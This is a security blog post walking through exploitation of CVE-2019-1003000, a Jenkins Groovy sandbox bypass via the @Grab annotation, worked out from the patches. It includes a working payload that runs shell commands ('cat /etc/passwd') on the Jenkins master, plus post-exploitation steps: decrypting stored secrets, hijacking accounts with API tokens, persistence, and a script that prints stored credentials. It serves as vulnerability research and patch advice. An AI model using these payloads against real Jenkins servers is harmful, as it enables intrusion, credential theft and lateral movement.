---
title: "A Case Study on Jenkins RCE"
author: "Adam Jordan"
description: "During my past experience assessing the security of Jenkins, I found several things I personally deemed interesting,
such as how to craft RCE payload by analyzing patches and how critical the information a Jenkins instance possesses.
In this post, I will walk through each step starting from initial information gathering to potential post-exploitation techniques in a Jenkins instance.
I will discuss the thinking process and the possible damage impacted in case of compromise.
"
tags: [Security]
date: 2020-01-20T17:40:00+08:00
draft: true
---

During my past experience assessing the security of Jenkins, I found several things I personally deemed interesting,
such as how to craft RCE payload by analyzing patches and how critical the information a Jenkins instance possesses.
In this post, I will walk through each step starting from initial information gathering to potential post-exploitation techniques in a Jenkins instance.
I will discuss the thinking process and the possible damage impacted in case of compromise.


## Information Gathering

The first thing to do is to collect information about past vulnerabilities and exploits.
The best place to find this information is the [Jenkin's official security advisories](https://jenkins.io/security/advisories/).
At that time (January 2019), we saw that there is a _Sandbox Bypass_ vulnerability patched in the latest version in the
[2019-01-08 Advisory](https://jenkins.io/security/advisory/2019-01-08/).


> **Sandbox Bypass in Script Security and Pipeline Plugins**

> **SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)**

> Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as @Grab to source code elements.

> Both the pipeline validation REST APIs and actual script/pipeline execution are affected.

> This allowed users with Overall/Read permission, or able to control Jenkinsfile or sandboxed Pipeline shared library contents in SCM, to bypass the sandbox protection and execute arbitrary code on the Jenkins master.

> All known unsafe AST transformations in Groovy are now prohibited in sandboxed scripts.


At that time, the proof of concept is not yet published by the reporter ([Orange Tsai](https://twitter.com/orange_8361/status/1085510564393041925)).
Since we are interested in how to exploit this vulnerability, the thing we can do is to look into the patches.
This is quite easy because Jenkins is an open-source project.
We can see every detailed commit on their repository.
We can find the related commit in [Bugzilla page](https://bugzilla.redhat.com/show_bug.cgi?id=1667566).

The upstream patches:

- https://github.com/jenkinsci/pipeline-model-definition-plugin/commit/083abd96e68fd89f556a0cd53db5f878dbf09b92
- https://github.com/jenkinsci/script-security-plugin/commit/2c5122e50742dd16492f9424992deb21cc07837c
- https://github.com/jenkinsci/workflow-cps-plugin/commit/d09583eda7898eafdd15297697abdd939c6ba5b6


## Reading the Patches

In the repository, we can see that the patches are blacklisting some annotations. Let's examine this [commit](https://github.com/jenkinsci/workflow-cps-plugin/commit/d09583eda7898eafdd15297697abdd939c6ba5b6).

We can see that there is a difference in how `GroovySandbox` class creates the _compiler configuration_.
There is an additional step that add _compilation customizer_ `RejectASTTransformsCustomizer` that with a the disabled transformations of only a single value: `GrabAnnotationTransformation.class.getName()`.

![Compiler Configuration Diff](/post_assets/001/commit-compiler-configuration.png)


The `RejectASTTransformsCustomizer` is a new class with a logic that traverse annotations and do simple blacklist checking:

![Reject Transformation Commit](/post_assets/001/commit-reject-transformation.png)


We can also see that there is a new test code that check if the blacklist `Grab` annotation.

![Test Code Commit](/post_assets/001/commit-test-code.png)


## The Grab Annotation

The `Grab` is an annotation implemented within the [Grape](http://docs.groovy-lang.org/latest/html/documentation/grape.html), a JAR dependency manager embedded into Groovy.
By using Grape, we can add any external maven repository dependencies to the classpath.


Example usage of Grab annotation is:
```java
 @Grab('commons-lang:commons-lang:2.4')
 import org.apache.commons.lang.WordUtils
 println "Hello ${WordUtils.capitalize('world')}"
```

During compile-time, this will add `commons-lang:commons-lang:2.4` library as dependency in classpath.
Then, we can import `org.apache.commons.lang.WordUtils` defined from `commons-lang`.


## Exploit Idea

For information, Jenkins's pipeline build script is written in groovy. 
Upon executing a pipeline job, this build script will be compiled (and executed) in Jenkins master, resulting in a definition of the pipeline, e.g. what to do in slave nodes.
As a security measure, Jenkins provides a mechanism for the script to be executed in _sandbox mode_. In sandbox mode, all dangerous functions are blacklisted, so regular user cannot do anything malicious to the Jenkins node servers.

As mentioned before, the build script is written in Groovy.
Groovy script allows us  to use any class or function in Java packages. However, in sandbox mode, dangerous built-in ones are blacklisted.
But we can see that's not the case for **non-built-in** class.

Furthermore, we can use meta-programming available in Groovy to execute code during compile-time, which leads us to the `Grab` annotation.
With `Grab`, we can make Jenkins import arbitrary packages from external maven repository during build-script compile-time.

So the idea is: we need the Jenkins master process runner to import a java class with command execution functionality during job script compile-time.
Then, we use that java class to execute shell command in Jenkins master.


## Using @Grab to import malicious class

Some googling leads us to a java library called `jproc`.
After quick examination, we can use [`ProcBuilder`](https://github.com/fleipold/jproc/blob/master/src/main/java/org/buildobjects/process/ProcBuilder.java) class defined in [`org.buildobjects:jproc:2.2.3`](https://mvnrepository.com/artifact/org.buildobjects/jproc/2.2.3) to run system shell command.

So, putting everything together, the payload is defined as below:

```java
import org.buildobjects.process.ProcBuilder
@Grab('org.buildobjects:jproc:2.2.3')
class Dummy{ }
print new ProcBuilder("/bin/bash").withArgs("-c","cat /etc/passwd").run().getOutputString()
```

## RCE Demo

Let's try putting the pipeline script in a Jenkins Job with _Use Groovy Sandbox_ enabled.

![Job Script in Jenkins](/post_assets/001/jenkins-job-script.png)


After triggering the job build, the script above will be compiled and executed in Jenkins master. After the job build is done, we can see the result of the shell command `cat /etc/passwd` in the job console output.

![Passwd exposed in Jenkins](/post_assets/001/jenkins-passwd.png)


Furthermore, we can work on getting the reverse shell session using the same method.


## Post Exploitation

After getting shell access to the Jenkins master server.
The next thing we can do is to further increase the damage, including but not limited to:

- Obtain Jenkins web admin account
- Maintaining persistence
- Steal source code
- Steal keys and secrets


From a page [Securing JENKINS_HOME](https://wiki.jenkins.io/display/JENKINS/Securing+JENKINS_HOME), we know that Jenkins is putting all their info and states in `$JENKINS_HOME`, by default it is located in directory `/var/jenkins`.


#### Accessing encrypted sensitive information

Jenkins are not using any DBMS to store data, it stores data and states in XML file under `$JENKINS_HOME`.
In this directory, we can read (and modify) information about the users, jobs, etc.
However, sensitive data (e.g.s secrets) is encrypted.

Fortunately (_or unfortunately?_), Jenkins also stores the encryption key under the same `$JENKINS_HOME` directory.
I am not saying that this is a bad practice, because the problem of storing key itself is a hard problem. You may search more about this in google with term _"Secret Zero Problem"_.

Basically, there are two files needed for decrypting the encryption: `secrets/master.key` and `secrets/hudson.util.Secret`.
With these two file, we can decrypt all the encrypted information inside Jenkins.
For example we can decrypt Jenkins secret stored in `credentials.xml`. There are already many scripts on the internet for decrypting the Jenkins secret, e.g. [jenkins-decrypt](https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py).


#### Web admin account hijack

We can see a list of user at `$JENKINS_HOME/users`.
Moreover, we can see data or state about the user at `$JENKINS/users/[user]/config.xml`.
In an older Jenkins version, if a user has generated access tokens before, those access tokens are stored and retrievable in `config.xml`.

We can use this access token to authenticate in Jenkins Web dashboard by setting it in `Authorization` HTTP Header.
For demonstration, we can use curl to do _whoami_ in Jenkins:

![Account Hijack](/post_assets/001/post-whoami.png)


#### Maintaining Persistence

Apart from regular maintaining persistence techniques, such as using crontab, or injecting `.bashrc`, we can utilize the hijacked Jenkins admin account.
Jenkins provides a script console functionality that can be used admin to execute arbitrary Groovy script in **non-sandbox** mode.

![Script Console](/post_assets/001/post-console.png)

Moreover, we can also use this console to enumerate stored secrets in Jenkins with the following script:

```java
import com.cloudbees.plugins.credentials.*

// list credentials
credentials = SystemCredentialsProvider.getInstance().getCredentials()
println credentials

println ''
println credentials[0]['username'] + ':' + credentials[0]['password']
```

![Enumerate Credential in Console](/post_assets/001/post-credential.png)

Furthermore, most of the time Jenkins will also store a Git user **SSH Key**.
This is because of its nature as a CI/CD service, Jenkins usually store the SSH Key to **pull source code** and **deploy to production servers**.
If we can get access to this SSH Key, we can use it to steal source code, and also perform lateral movement to production servers, resulting in very big damage.


## Verdict on the Method

Different from a [writeup by Orange](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html) that does not require any valid user in Jenkins,
this method requires a valid Jenkins user with `Job/Configure` permission and optionally `Job/Build` to trigger build execution.
Nonetheless, this method displays how we can exploit CVE-2019-1003000 to escape the sandbox bypass, and then execute arbitrary command with a normal Jenkins user.
Furthermore, this vulnerability can also be chained with previous vulnerabilities that allow unauthenticated RCE.
I recommend reading this [article](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html).


## Postface

In real world case, we can imagine this vulnerability being exploited by both internal and external threat in a tech company.
Being a central CI/CD service, compromising Jenkins will lead attackers to gain access to source code, deployment credentials and secrets, and even supply chain attack.

We can learn from the past incidents that the damage is fatal:

- [GE Aviation passwords, source code exposed in open jenkins server](https://threatpost.com/ge-aviation-passwords-jenkins-server/146302/)

- [Matrix.org API keys stolen from unpatched Jenkins server, leading to defacement](https://matrix.org/blog/2019/04/11/we-have-discovered-and-addressed-a-security-breach-updated-2019-04-12/)

We need to also be aware that Jenkins is an old piece of software written in early 2000s and may contains many legacy code and bugs.

![Jenkins Vulnerabilities](/post_assets/001/verdict-vulns.png)

From the charts ([source](https://www.cvedetails.com/product/34004/Jenkins-Jenkins.html?vendor_id=15865)) displayed above,
we can see that Jenkins are affected by lots of critical vulnerabilities, especially in recent years.
Constant check and software update on Jenkins instance is highly recommended and necessary to create a safe environment within an organization.


#### Proof-of-Concept Source Code

I put a proof of concept based on this exploit method in Github:

> https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
